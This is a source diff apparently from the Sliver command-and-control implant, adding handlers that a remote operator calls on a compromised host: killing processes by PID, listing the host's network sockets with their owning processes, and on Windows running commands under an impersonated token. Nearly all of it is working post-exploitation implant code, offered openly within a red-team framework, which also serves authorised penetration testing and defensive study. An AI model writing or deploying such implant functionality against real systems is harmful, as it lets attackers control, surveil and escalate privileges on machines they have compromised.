@@ -33,23 +33,25 @@ import (
 	"log"
 	// {{end}}
 
+	// {{if eq .GOOS "windows"}}
+	"syscall"
+
+	"github.com/bishopfox/sliver/sliver/priv"
+	"golang.org/x/sys/windows"
+
+	// {{end}}
+
 	"os"
 	"path/filepath"
 
 	pb "github.com/bishopfox/sliver/protobuf/sliver"
+	"github.com/bishopfox/sliver/sliver/netstat"
 	"github.com/bishopfox/sliver/sliver/procdump"
 	"github.com/bishopfox/sliver/sliver/ps"
 	"github.com/bishopfox/sliver/sliver/taskrunner"
 
 	"github.com/golang/protobuf/proto"
 )
-
-// func killHandler(data []byte, resp RPCResponse) {
-// 	// {{if .Debug}}
-// 	log.Printf("Received kill command")
-// 	// {{end}}
-// 	os.Exit(0)
-// }
 
 func pingHandler(data []byte, resp RPCResponse) {
 	ping := &pb.Ping{}
@@ -96,6 +98,31 @@ func psHandler(data []byte, resp RPCResponse) {
 		})
 	}
 	data, err = proto.Marshal(psList)
+	resp(data, err)
+}
+
+func terminateHandler(data []byte, resp RPCResponse) {
+	var errStr string
+	terminateReq := &pb.TerminateReq{}
+	err := proto.Unmarshal(data, terminateReq)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	err = ps.Kill(int(terminateReq.Pid))
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("failed to list procs %v", err)
+		// {{end}}
+		errStr = err.Error()
+	}
+
+	termResp := &pb.Terminate{
+		Err: errStr,
+	}
+	data, err = proto.Marshal(termResp)
 	resp(data, err)
 }
 
@@ -429,6 +456,12 @@ func executeHandler(data []byte, resp RPCResponse) {
 	}
 	execResp := &pb.Execute{}
 	cmd = exec.Command(execReq.Path)
+	//{{if eq .GOOS "windows"}}
+	cmd.SysProcAttr = &windows.SysProcAttr{
+		Token: syscall.Token(priv.CurrentToken),
+	}
+	//{{end}}
+
 	if len(execReq.Args) != 0 {
 		cmd.Args = execReq.Args
 	}
@@ -450,6 +483,114 @@ func executeHandler(data []byte, resp RPCResponse) {
 	}
 	data, err = proto.Marshal(execResp)
 	resp(data, err)
+}
+
+func netstatHandler(data []byte, resp RPCResponse) {
+	netstatReq := &pb.NetstatRequest{}
+	err := proto.Unmarshal(data, netstatReq)
+	if err != nil {
+		//{{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		//{{end}}
+		return
+	}
+
+	result := &pb.NetstatResponse{}
+	entries := make([]*pb.SockTabEntry, 0)
+
+	if netstatReq.UDP {
+		if netstatReq.IP4 {
+			tabs, err := netstat.UDPSocks(netstat.NoopFilter)
+			if err != nil {
+				//{{if .Debug}}
+				log.Printf("netstat failed: %v", err)
+				//{{end}}
+				return
+			}
+			entries = append(entries, buildEntries("udp", tabs)...)
+		}
+		if netstatReq.IP6 {
+			tabs, err := netstat.UDP6Socks(netstat.NoopFilter)
+			if err != nil {
+				//{{if .Debug}}
+				log.Printf("netstat failed: %v", err)
+				//{{end}}
+				return
+			}
+			entries = append(entries, buildEntries("udp6", tabs)...)
+		}
+	}
+
+	if netstatReq.TCP {
+		var fn netstat.AcceptFn
+		switch {
+		case netstatReq.Listening:
+			fn = func(s *netstat.SockTabEntry) bool {
+				return s.State == netstat.Listen
+			}
+		default:
+			fn = func(s *netstat.SockTabEntry) bool {
+				return s.State != netstat.Listen
+			}
+		}
+
+		if netstatReq.IP4 {
+			tabs, err := netstat.TCPSocks(fn)
+			if err != nil {
+				//{{if .Debug}}
+				log.Printf("netstat failed: %v", err)
+				//{{end}}
+				return
+			}
+			entries = append(entries, buildEntries("tcp", tabs)...)
+		}
+
+		if netstatReq.IP6 {
+			tabs, err := netstat.TCP6Socks(fn)
+			if err != nil {
+				//{{if .Debug}}
+				log.Printf("netstat failed: %v", err)
+				//{{end}}
+				return
+			}
+			entries = append(entries, buildEntries("tcp6", tabs)...)
+		}
+		result.Entries = entries
+		data, err := proto.Marshal(result)
+		resp(data, err)
+	}
+}
+
+func buildEntries(proto string, s []netstat.SockTabEntry) []*pb.SockTabEntry {
+	entries := make([]*pb.SockTabEntry, 0)
+	for _, e := range s {
+		var (
+			pid  int32
+			exec string
+		)
+		if e.Process != nil {
+			pid = int32(e.Process.Pid)
+			exec = e.Process.Name
+		}
+		entries = append(entries, &pb.SockTabEntry{
+			LocalAddr: &pb.SockTabEntry_SockAddr{
+				Ip:   e.LocalAddr.String(),
+				Port: uint32(e.LocalAddr.Port),
+			},
+			RemoteAddr: &pb.SockTabEntry_SockAddr{
+				Ip:   e.RemoteAddr.String(),
+				Port: uint32(e.RemoteAddr.Port),
+			},
+			SkState: e.State.String(),
+			UID:     e.UID,
+			Proc: &pb.Process{
+				Pid:        pid,
+				Executable: exec,
+			},
+			Proto: proto,
+		})
+	}
+	return entries
 }
 
 // ---------------- Data Encoders ----------------
